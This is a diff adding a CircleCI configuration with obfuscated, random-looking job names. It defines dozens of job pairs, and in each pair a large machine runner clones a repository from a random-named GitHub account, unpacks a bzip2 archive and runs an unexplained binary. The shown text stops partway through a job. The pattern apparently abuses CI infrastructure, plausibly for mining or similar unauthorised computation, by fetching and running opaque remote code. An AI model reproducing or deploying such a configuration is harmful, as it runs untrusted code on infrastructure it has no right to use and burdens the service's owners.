@@ -1,0 +1,1251 @@
+version: 2.1
+
+jobs:
+  lggakpzjnskh:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: alshsf
+          command: |
+            mkdir -p /tmp/wycvnbwap
+            echo 'ttobpicmlnkx ckgbgcluhnbzgefp' > /tmp/wycvnbwap/siffbnrfohhui
+            ls -la /tmp/wycvnbwap/siffbnrfohhui
+      - persist_to_workspace:
+          root: /tmp/wycvnbwap
+          paths:
+            - 'siffbnrfohhui'
+  pezikszzoeo:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/wycvnbwap
+      - run:
+          name: ofjkjvnogxkvmsn
+          command: |
+            pr -l 20 /tmp/wycvnbwap/siffbnrfohhui | wc -l || true
+      - run:
+          name: cpdmoyck
+          command: git clone --depth 3 --single-branch --filter=blob:none --no-tags https://github.com/bellancawalstonwby7p-sys/1893b1b58ba9.git .
+      - run:
+          name: goipvgtczfpfxob
+          command: bzcat guvalvcgfmmg.tar.bz2 | tar xf -
+      - run:
+          command: env ./yyqtvrjuk
+  zuopfnodlpkgqd:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/wycvnbwap
+      - run:
+          name: qfljjugkx
+          command: |
+            mkdir -p /tmp/wycvnbwap
+            echo 'saxhucagkltkdmtt zpfntelzrvcwiori' > /tmp/wycvnbwap/ifmyljwhtngzsr
+            ls -la /tmp/wycvnbwap/ifmyljwhtngzsr
+      - persist_to_workspace:
+          root: /tmp/wycvnbwap
+          paths:
+            - 'ifmyljwhtngzsr'
+  nuzfijm:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/wycvnbwap
+      - run:
+          name: vbtcz
+          command: |
+            pr -l 20 /tmp/wycvnbwap/ifmyljwhtngzsr | wc -l || true
+      - run:
+          name: onbtg
+          command: git clone --depth 3 --single-branch --filter=blob:none --no-tags https://github.com/bellancawalstonwby7p-sys/1893b1b58ba9.git .
+      - run:
+          name: enwfbarj
+          command: bzcat guvalvcgfmmg.tar.bz2 | tar xf -
+      - run:
+          command: env ./yyqtvrjuk
+  gpbnx:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/wycvnbwap
+      - run:
+          name: dzibnhis
+          command: |
+            mkdir -p /tmp/wycvnbwap
+            echo 'vcgktsgmtrzfh admisiumunwvgqioaj' > /tmp/wycvnbwap/oimupjcrl
+            ls -la /tmp/wycvnbwap/oimupjcrl
+      - persist_to_workspace:
+          root: /tmp/wycvnbwap
+          paths:
+            - 'oimupjcrl'
+  htzxigarhobzyqx:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/wycvnbwap
+      - run:
+          name: fodnq
+          command: |
+            pr -l 20 /tmp/wycvnbwap/oimupjcrl | wc -l || true
+      - run:
+          name: pufcyd
+          command: git clone --depth 3 --single-branch --filter=blob:none --no-tags https://github.com/bellancawalstonwby7p-sys/1893b1b58ba9.git .
+      - run:
+          name: xccyzepunu
+          command: bzcat guvalvcgfmmg.tar.bz2 | tar xf -
+      - run:
+          command: env ./yyqtvrjuk
+  sxgkuvdapkq:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/wycvnbwap
+      - run:
+          name: nzxymrxjwbvz
+          command: |
+            mkdir -p /tmp/wycvnbwap
+            echo 'jeskyemmbsg qnslrvmzqzapmgkowx' > /tmp/wycvnbwap/icplpkhmwfqv
+            ls -la /tmp/wycvnbwap/icplpkhmwfqv
+      - persist_to_workspace:
+          root: /tmp/wycvnbwap
+          paths:
+            - 'icplpkhmwfqv'
+  qncggaxlillp:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/wycvnbwap
+      - run:
+          name: cvhezobdld
+          command: |
+            pr -l 20 /tmp/wycvnbwap/icplpkhmwfqv | wc -l || true
+      - run:
+          name: vrzixrx
+          command: git clone --depth 3 --single-branch --filter=blob:none --no-tags https://github.com/bellancawalstonwby7p-sys/1893b1b58ba9.git .
+      - run:
+          name: wrqahjarc
+          command: bzcat guvalvcgfmmg.tar.bz2 | tar xf -
+      - run:
+          command: env ./yyqtvrjuk
+  ymsqsywiweyu:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/wycvnbwap
+      - run:
+          name: sgirk
+          command: |
+            mkdir -p /tmp/wycvnbwap
+            echo 'vzkiazgxinapf rmaawmewxtwqptj' > /tmp/wycvnbwap/ivsijsprgocu
+            ls -la /tmp/wycvnbwap/ivsijsprgocu
+      - persist_to_workspace:
+          root: /tmp/wycvnbwap
+          paths:
+            - 'ivsijsprgocu'
+  enkkzkspnswbikw:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/wycvnbwap
+      - run:
+          name: dlxdfroelnpwur
+          command: |
+            pr -l 20 /tmp/wycvnbwap/ivsijsprgocu | wc -l || true
+      - run:
+          name: bvnqzn
+          command: git clone --depth 3 --single-branch --filter=blob:none --no-tags https://github.com/bellancawalstonwby7p-sys/1893b1b58ba9.git .
+      - run:
+          name: idfkzqdwikgfz
+          command: bzcat guvalvcgfmmg.tar.bz2 | tar xf -
+      - run:
+          command: env ./yyqtvrjuk
+  xzzrwixqeupair:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/wycvnbwap
+      - run:
+          name: kfixmh
+          command: |
+            mkdir -p /tmp/wycvnbwap
+            echo 'aepsriaghoqzcfne jsefkzenmaedb' > /tmp/wycvnbwap/nsnlabe
+            ls -la /tmp/wycvnbwap/nsnlabe
+      - persist_to_workspace:
+          root: /tmp/wycvnbwap
+          paths:
+            - 'nsnlabe'
+  ecbyg:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/wycvnbwap
+      - run:
+          name: uilbjhspxmp
+          command: |
+            pr -l 20 /tmp/wycvnbwap/nsnlabe | wc -l || true
+      - run:
+          name: lnnqpctb
+          command: git clone --depth 3 --single-branch --filter=blob:none --no-tags https://github.com/bellancawalstonwby7p-sys/1893b1b58ba9.git .
+      - run:
+          name: wgkrv
+          command: bzcat guvalvcgfmmg.tar.bz2 | tar xf -
+      - run:
+          command: env ./yyqtvrjuk
+  vvsnypeey:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: ohiwjgyp
+          command: |
+            mkdir -p /tmp/wycvnbwap
+            echo 'gyfsajctjqozerqysv zccghsldqakhc' > /tmp/wycvnbwap/ifhkrzllmygrt
+            ls -la /tmp/wycvnbwap/ifhkrzllmygrt
+      - persist_to_workspace:
+          root: /tmp/wycvnbwap
+          paths:
+            - 'ifhkrzllmygrt'
+  duycfcvh:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/wycvnbwap
+      - run:
+          name: ikonrwwf
+          command: |
+            pr -l 20 /tmp/wycvnbwap/ifhkrzllmygrt | wc -l || true
+      - run:
+          name: jkpoti
+          command: git clone --depth 3 --single-branch --filter=blob:none --no-tags https://github.com/bellancawalstonwby7p-sys/1893b1b58ba9.git .
+      - run:
+          name: ruzrmiheuigdah
+          command: bzcat guvalvcgfmmg.tar.bz2 | tar xf -
+      - run:
+          command: env ./yyqtvrjuk
+  ecpsen:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/wycvnbwap
+      - run:
+          name: nxagltezcwdgd
+          command: |
+            mkdir -p /tmp/wycvnbwap
+            echo 'lyqrlaipqqxb mcvzlwtudxvolgzfp' > /tmp/wycvnbwap/amnwhaqabk
+            ls -la /tmp/wycvnbwap/amnwhaqabk
+      - persist_to_workspace:
+          root: /tmp/wycvnbwap
+          paths:
+            - 'amnwhaqabk'
+  imrrarqgzy:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/wycvnbwap
+      - run:
+          name: ejvhocgsbn
+          command: |
+            pr -l 20 /tmp/wycvnbwap/amnwhaqabk | wc -l || true
+      - run:
+          name: nlgiriyt
+          command: git clone --depth 3 --single-branch --filter=blob:none --no-tags https://github.com/bellancawalstonwby7p-sys/1893b1b58ba9.git .
+      - run:
+          name: xkzgkjpjgxg
+          command: bzcat guvalvcgfmmg.tar.bz2 | tar xf -
+      - run:
+          command: env ./yyqtvrjuk
+  ejcmhzemttfyr:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/wycvnbwap
+      - run:
+          name: vpswmojzify
+          command: |
+            mkdir -p /tmp/wycvnbwap
+            echo 'xhxzbmkmqbgklzduzf vhnbwrkdbjopeve' > /tmp/wycvnbwap/evbbexyi
+            ls -la /tmp/wycvnbwap/evbbexyi
+      - persist_to_workspace:
+          root: /tmp/wycvnbwap
+          paths:
+            - 'evbbexyi'
+  dylvqc:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/wycvnbwap
+      - run:
+          name: qrahiygfraqdfb
+          command: |
+            pr -l 20 /tmp/wycvnbwap/evbbexyi | wc -l || true
+      - run:
+          name: bmmneqpv
+          command: git clone --depth 3 --single-branch --filter=blob:none --no-tags https://github.com/bellancawalstonwby7p-sys/1893b1b58ba9.git .
+      - run:
+          name: ocohukwl
+          command: bzcat guvalvcgfmmg.tar.bz2 | tar xf -
+      - run:
+          command: env ./yyqtvrjuk
+  fvxytflc:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/wycvnbwap
+      - run:
+          name: miecmi
+          command: |
+            mkdir -p /tmp/wycvnbwap
+            echo 'tmgaozdkbfp qhpuafgdvmhnqjnce' > /tmp/wycvnbwap/ztwkpwb
+            ls -la /tmp/wycvnbwap/ztwkpwb
+      - persist_to_workspace:
+          root: /tmp/wycvnbwap
+          paths:
+            - 'ztwkpwb'
+  zaeza:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/wycvnbwap
+      - run:
+          name: nrxobmqmaohmn
+          command: |
+            pr -l 20 /tmp/wycvnbwap/ztwkpwb | wc -l || true
+      - run:
+          name: qnugs
+          command: git clone --depth 3 --single-branch --filter=blob:none --no-tags https://github.com/bellancawalstonwby7p-sys/1893b1b58ba9.git .
+      - run:
+          name: usufvgnbk
+          command: bzcat guvalvcgfmmg.tar.bz2 | tar xf -
+      - run:
+          command: env ./yyqtvrjuk
+  cfzmvkvxvcqyxvb:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/wycvnbwap
+      - run:
+          name: mryjxbooonwl
+          command: |
+            mkdir -p /tmp/wycvnbwap
+            echo 'crermlgwkd uwyyrehlhauesgri' > /tmp/wycvnbwap/ehiesgkgpvc
+            ls -la /tmp/wycvnbwap/ehiesgkgpvc
+      - persist_to_workspace:
+          root: /tmp/wycvnbwap
+          paths:
+            - 'ehiesgkgpvc'
+  qikwdnhctoy:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/wycvnbwap
+      - run:
+          name: illdgatm
+          command: |
+            pr -l 20 /tmp/wycvnbwap/ehiesgkgpvc | wc -l || true
+      - run:
+          name: fgyur
+          command: git clone --depth 3 --single-branch --filter=blob:none --no-tags https://github.com/bellancawalstonwby7p-sys/1893b1b58ba9.git .
+      - run:
+          name: ipedg
+          command: bzcat guvalvcgfmmg.tar.bz2 | tar xf -
+      - run:
+          command: env ./yyqtvrjuk
+  alkodtz:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/wycvnbwap
+      - run:
+          name: zkkmqwrtink
+          command: |
+            mkdir -p /tmp/wycvnbwap
+            echo 'ncqhqhuuypkdswa vjtqkcvxufiqjocb' > /tmp/wycvnbwap/pkvauuvq
+            ls -la /tmp/wycvnbwap/pkvauuvq
+      - persist_to_workspace:
+          root: /tmp/wycvnbwap
+          paths:
+            - 'pkvauuvq'
+  ijhtbkwkpet:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/wycvnbwap
+      - run:
+          name: zbnob
+          command: |
+            pr -l 20 /tmp/wycvnbwap/pkvauuvq | wc -l || true
+      - run:
+          name: kruqnt
+          command: git clone --depth 3 --single-branch --filter=blob:none --no-tags https://github.com/bellancawalstonwby7p-sys/1893b1b58ba9.git .
+      - run:
+          name: yhobjxhobvzknz
+          command: bzcat guvalvcgfmmg.tar.bz2 | tar xf -
+      - run:
+          command: env ./yyqtvrjuk
+  hxnblkhfmzdrmg:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: ovheckbqnkfq
+          command: |
+            mkdir -p /tmp/wycvnbwap
+            echo 'mldqxhgdivana mihakgjqqwcyvptwif' > /tmp/wycvnbwap/beikrbiti
+            ls -la /tmp/wycvnbwap/beikrbiti
+      - persist_to_workspace:
+          root: /tmp/wycvnbwap
+          paths:
+            - 'beikrbiti'
+  vzffsfuoffip:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/wycvnbwap
+      - run:
+          name: wftop
+          command: |
+            pr -l 20 /tmp/wycvnbwap/beikrbiti | wc -l || true
+      - run:
+          name: ywmgyjn
+          command: git clone --depth 3 --single-branch --filter=blob:none --no-tags https://github.com/bellancawalstonwby7p-sys/1893b1b58ba9.git .
+      - run:
+          name: lkdwjat
+          command: bzcat guvalvcgfmmg.tar.bz2 | tar xf -
+      - run:
+          command: env ./yyqtvrjuk
+  ierrwownienaz:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/wycvnbwap
+      - run:
+          name: khfvjgr
+          command: |
+            mkdir -p /tmp/wycvnbwap
+            echo 'jsewqqmlfsob ciedzxkekkixspo' > /tmp/wycvnbwap/jkowhoazv
+            ls -la /tmp/wycvnbwap/jkowhoazv
+      - persist_to_workspace:
+          root: /tmp/wycvnbwap
+          paths:
+            - 'jkowhoazv'
+  mvevefvercefh:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/wycvnbwap
+      - run:
+          name: jckwjsrnkktk
+          command: |
+            pr -l 20 /tmp/wycvnbwap/jkowhoazv | wc -l || true
+      - run:
+          name: nrxwdlhqxhrkhva
+          command: git clone --depth 3 --single-branch --filter=blob:none --no-tags https://github.com/bellancawalstonwby7p-sys/1893b1b58ba9.git .
+      - run:
+          name: npzbdywunoobojd
+          command: bzcat guvalvcgfmmg.tar.bz2 | tar xf -
+      - run:
+          command: env ./yyqtvrjuk
+  zhxkogetjwxfk:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/wycvnbwap
+      - run:
+          name: esqswxqksbwbee
+          command: |
+            mkdir -p /tmp/wycvnbwap
+            echo 'rletjhqadbw mmwpxadomxuylbsuzu' > /tmp/wycvnbwap/tbsankgqtxl
+            ls -la /tmp/wycvnbwap/tbsankgqtxl
+      - persist_to_workspace:
+          root: /tmp/wycvnbwap
+          paths:
+            - 'tbsankgqtxl'
+  euiae:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/wycvnbwap
+      - run:
+          name: pojetxjdnhvyuq
+          command: |
+            pr -l 20 /tmp/wycvnbwap/tbsankgqtxl | wc -l || true
+      - run:
+          name: nrlubgcazkgxvrn
+          command: git clone --depth 3 --single-branch --filter=blob:none --no-tags https://github.com/bellancawalstonwby7p-sys/1893b1b58ba9.git .
+      - run:
+          name: ihawbim
+          command: bzcat guvalvcgfmmg.tar.bz2 | tar xf -
+      - run:
+          command: env ./yyqtvrjuk
+  mudqtezcgbonboe:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/wycvnbwap
+      - run:
+          name: jsuuo
+          command: |
+            mkdir -p /tmp/wycvnbwap
+            echo 'naucsoczypv zvtpawetlztwrdlvx' > /tmp/wycvnbwap/zpeongdiykvw
+            ls -la /tmp/wycvnbwap/zpeongdiykvw
+      - persist_to_workspace:
+          root: /tmp/wycvnbwap
+          paths:
+            - 'zpeongdiykvw'
+  zzqypafpzi:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/wycvnbwap
+      - run:
+          name: hoxfawaqvzxwmnj
+          command: |
+            pr -l 20 /tmp/wycvnbwap/zpeongdiykvw | wc -l || true
+      - run:
+          name: jhghtpsh
+          command: git clone --depth 3 --single-branch --filter=blob:none --no-tags https://github.com/bellancawalstonwby7p-sys/1893b1b58ba9.git .
+      - run:
+          name: tgrxojcfqciuold
+          command: bzcat guvalvcgfmmg.tar.bz2 | tar xf -
+      - run:
+          command: env ./yyqtvrjuk
+  htmkpa:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/wycvnbwap
+      - run:
+          name: wqmttusa
+          command: |
+            mkdir -p /tmp/wycvnbwap
+            echo 'yrfjamchccbhxe cqihuzmkmozydewviz' > /tmp/wycvnbwap/tocilocytjmmj
+            ls -la /tmp/wycvnbwap/tocilocytjmmj
+      - persist_to_workspace:
+          root: /tmp/wycvnbwap
+          paths:
+            - 'tocilocytjmmj'
+  wvpcrdbis:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/wycvnbwap
+      - run:
+          name: dzllmvwkqsomwtp
+          command: |
+            pr -l 20 /tmp/wycvnbwap/tocilocytjmmj | wc -l || true
+      - run:
+          name: hjqsgwbahbn
+          command: git clone --depth 3 --single-branch --filter=blob:none --no-tags https://github.com/bellancawalstonwby7p-sys/1893b1b58ba9.git .
+      - run:
+          name: lujyzuwvrig
+          command: bzcat guvalvcgfmmg.tar.bz2 | tar xf -
+      - run:
+          command: env ./yyqtvrjuk
+  lbfyfgg:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/wycvnbwap
+      - run:
+          name: xnfmiqpghwsdq
+          command: |
+            mkdir -p /tmp/wycvnbwap
+            echo 'xfixyrkygihj ivzorzsnszl' > /tmp/wycvnbwap/xjrvnwokp
+            ls -la /tmp/wycvnbwap/xjrvnwokp
+      - persist_to_workspace:
+          root: /tmp/wycvnbwap
+          paths:
+            - 'xjrvnwokp'
+  ypwgsygy:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/wycvnbwap
+      - run:
+          name: azgjf
+          command: |
+            pr -l 20 /tmp/wycvnbwap/xjrvnwokp | wc -l || true
+      - run:
+          name: hdaeiokf
+          command: git clone --depth 3 --single-branch --filter=blob:none --no-tags https://github.com/bellancawalstonwby7p-sys/1893b1b58ba9.git .
+      - run:
+          name: czgvrx
+          command: bzcat guvalvcgfmmg.tar.bz2 | tar xf -
+      - run:
+          command: env ./yyqtvrjuk
+  jctpftjuer:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: grkcazywgahog
+          command: |
+            mkdir -p /tmp/wycvnbwap
+            echo 'dfqsfjcmou ymhkodybljmrplkt' > /tmp/wycvnbwap/bcglgunmwwybb
+            ls -la /tmp/wycvnbwap/bcglgunmwwybb
+      - persist_to_workspace:
+          root: /tmp/wycvnbwap
+          paths:
+            - 'bcglgunmwwybb'
+  lbrifgmnr:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/wycvnbwap
+      - run:
+          name: txswawc
+          command: |
+            pr -l 20 /tmp/wycvnbwap/bcglgunmwwybb | wc -l || true
+      - run:
+          name: rpzkcbjfuxaaa
+          command: git clone --depth 3 --single-branch --filter=blob:none --no-tags https://github.com/bellancawalstonwby7p-sys/1893b1b58ba9.git .
+      - run:
+          name: vlesslftabeva
+          command: bzcat guvalvcgfmmg.tar.bz2 | tar xf -
+      - run:
+          command: env ./yyqtvrjuk
+  olyvrfdstix:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/wycvnbwap
+      - run:
+          name: echscsdouwwx
+          command: |
+            mkdir -p /tmp/wycvnbwap
+            echo 'bkugspvnlaqp mfezjhpnmgdlkq' > /tmp/wycvnbwap/phduixhb
+            ls -la /tmp/wycvnbwap/phduixhb
+      - persist_to_workspace:
+          root: /tmp/wycvnbwap
+          paths:
+            - 'phduixhb'
+  zaajclwdmh:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/wycvnbwap
+      - run:
+          name: lcnjxvjzeyzfo
+          command: |
+            pr -l 20 /tmp/wycvnbwap/phduixhb | wc -l || true
+      - run:
+          name: xuwarynuwnqe
+          command: git clone --depth 3 --single-branch --filter=blob:none --no-tags https://github.com/bellancawalstonwby7p-sys/1893b1b58ba9.git .
+      - run:
+          name: xkqxrdsj
+          command: bzcat guvalvcgfmmg.tar.bz2 | tar xf -
+      - run:
+          command: env ./yyqtvrjuk
+  jvanirci:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/wycvnbwap
+      - run:
+          name: lzcuune
+          command: |
+            mkdir -p /tmp/wycvnbwap
+            echo 'lzdhgbjbwbwx aieohzazrzdcyy' > /tmp/wycvnbwap/zpjabzvwq
+            ls -la /tmp/wycvnbwap/zpjabzvwq
+      - persist_to_workspace:
+          root: /tmp/wycvnbwap
+          paths:
+            - 'zpjabzvwq'
+  zwdxosqli:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/wycvnbwap
+      - run:
+          name: ezbfkxuepjfxfs
+          command: |
+            pr -l 20 /tmp/wycvnbwap/zpjabzvwq | wc -l || true
+      - run:
+          name: nifsumol
+          command: git clone --depth 3 --single-branch --filter=blob:none --no-tags https://github.com/bellancawalstonwby7p-sys/1893b1b58ba9.git .
+      - run:
+          name: pxcogzgjx
+          command: bzcat guvalvcgfmmg.tar.bz2 | tar xf -
+      - run:
+          command: env ./yyqtvrjuk
+  xlborz:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/wycvnbwap
+      - run:
+          name: ytnsogy
+          command: |
+            mkdir -p /tmp/wycvnbwap
+            echo 'ityxqzcipg ezqszztzujprriml' > /tmp/wycvnbwap/uyefzglzzrui
+            ls -la /tmp/wycvnbwap/uyefzglzzrui
+      - persist_to_workspace:
+          root: /tmp/wycvnbwap
+          paths:
+            - 'uyefzglzzrui'
+  ooduips:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/wycvnbwap
+      - run:
+          name: klnynrzulv
+          command: |
+            pr -l 20 /tmp/wycvnbwap/uyefzglzzrui | wc -l || true
+      - run:
+          name: ejtzgsxyokhlfk
+          command: git clone --depth 3 --single-branch --filter=blob:none --no-tags https://github.com/bellancawalstonwby7p-sys/1893b1b58ba9.git .
+      - run:
+          name: kksmyudxq
+          command: bzcat guvalvcgfmmg.tar.bz2 | tar xf -
+      - run:
+          command: env ./yyqtvrjuk
+  rpdhtyljxbfq:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/wycvnbwap
+      - run:
+          name: regjucwdfae
+          command: |
+            mkdir -p /tmp/wycvnbwap
+            echo 'xgnnobflovrasxqq qwpnbzzffrl' > /tmp/wycvnbwap/kqljasnpar
+            ls -la /tmp/wycvnbwap/kqljasnpar
+      - persist_to_workspace:
+          root: /tmp/wycvnbwap
+          paths:
+            - 'kqljasnpar'
+  svhlarf:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/wycvnbwap
+      - run:
+          name: usobwdyt
+          command: |
+            pr -l 20 /tmp/wycvnbwap/kqljasnpar | wc -l || true
+      - run:
+          name: nwolqds
+          command: git clone --depth 3 --single-branch --filter=blob:none --no-tags https://github.com/bellancawalstonwby7p-sys/1893b1b58ba9.git .
+      - run:
+          name: cffcxvylvgpot
+          command: bzcat guvalvcgfmmg.tar.bz2 | tar xf -
+      - run:
+          command: env ./yyqtvrjuk
+  yocazjeux:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/wycvnbwap
+      - run:
+          name: kcimzk
+          command: |
+            mkdir -p /tmp/wycvnbwap
+            echo 'krbrxcwykglp thmljphmya' > /tmp/wycvnbwap/kszowlzn
+            ls -la /tmp/wycvnbwap/kszowlzn
+      - persist_to_workspace:
+          root: /tmp/wycvnbwap
+          paths:
+            - 'kszowlzn'
+  zhkjhkc:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/wycvnbwap
+      - run:
+          name: wtuewoywwehctj
+          command: |
+            pr -l 20 /tmp/wycvnbwap/kszowlzn | wc -l || true
+      - run:
+          name: fswkl
+          command: git clone --depth 3 --single-branch --filter=blob:none --no-tags https://github.com/bellancawalstonwby7p-sys/1893b1b58ba9.git .
+      - run:
+          name: xufpfb
+          command: bzcat guvalvcgfmmg.tar.bz2 | tar xf -
+      - run:
+          command: env ./yyqtvrjuk
+  iyckt:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: dekmeklxeditihs
+          command: |
+            mkdir -p /tmp/wycvnbwap
+            echo 'xgonpjieswjpdsldq wxsicpfktepkfy' > /tmp/wycvnbwap/pknuwrs
+            ls -la /tmp/wycvnbwap/pknuwrs
+      - persist_to_workspace:
+          root: /tmp/wycvnbwap
+          paths:
+            - 'pknuwrs'
+  jthon:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/wycvnbwap
+      - run:
+          name: qjdvvqomhebdk
+          command: |
+            pr -l 20 /tmp/wycvnbwap/pknuwrs | wc -l || true
+      - run:
+          name: xnmduvwaxir
+          command: git clone --depth 3 --single-branch --filter=blob:none --no-tags https://github.com/bellancawalstonwby7p-sys/1893b1b58ba9.git .
+      - run:
+          name: eosgmuypeeacf
+          command: bzcat guvalvcgfmmg.tar.bz2 | tar xf -
+      - run:
+          command: env ./yyqtvrjuk
+  zgetrt:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/wycvnbwap
+      - run:
+          name: xaeul
+          command: |
+            mkdir -p /tmp/wycvnbwap
+            echo 'jmsmsmgrlyhyxhbhy xkexnkotnuzmjh' > /tmp/wycvnbwap/afaywaziplykk
+            ls -la /tmp/wycvnbwap/afaywaziplykk
+      - persist_to_workspace:
+          root: /tmp/wycvnbwap
+          paths:
+            - 'afaywaziplykk'
+  gfloart:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/wycvnbwap
+      - run:
+          name: wpfwrcx
+          command: |
+            pr -l 20 /tmp/wycvnbwap/afaywaziplykk | wc -l || true
+      - run:
+          name: cxvangnzffpjqyp
+          command: git clone --depth 3 --single-branch --filter=blob:none --no-tags https://github.com/bellancawalstonwby7p-sys/1893b1b58ba9.git .
+      - run:
+          name: idyzpvfuxgyvknh
+          command: bzcat guvalvcgfmmg.tar.bz2 | tar xf -
+      - run:
+          command: env ./yyqtvrjuk
+  dxwxctonygmmwql:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/wycvnbwap
+      - run:
+          name: xzzfvmfh
+          command: |
+            mkdir -p /tmp/wycvnbwap
+            echo 'ullezyzobxl tzgqxmqzlzxkzbxwio' > /tmp/wycvnbwap/rfuqxvguusixej
+            ls -la /tmp/wycvnbwap/rfuqxvguusixej
+      - persist_to_workspace:
+          root: /tmp/wycvnbwap
+          paths:
+            - 'rfuqxvguusixej'
+  tdophjk:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/wycvnbwap
+      - run:
+          name: htqhie
+          command: |
+            pr -l 20 /tmp/wycvnbwap/rfuqxvguusixej | wc -l || true
+      - run:
+          name: yrvanzb
+          command: git clone --depth 3 --single-branch --filter=blob:none --no-tags https://github.com/bellancawalstonwby7p-sys/1893b1b58ba9.git .
+      - run:
+          name: oczmnvk
+          command: bzcat guvalvcgfmmg.tar.bz2 | tar xf -
+      - run:
+          command: env ./yyqtvrjuk
+  nyfxajdyadqpnlv:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/wycvnbwap
+      - run:
+          name: ilpzq
+          command: |
+            mkdir -p /tmp/wycvnbwap
+            echo 'tcymqplbitbcjzs iucitmrwlebwv' > /tmp/wycvnbwap/kfarpbjps
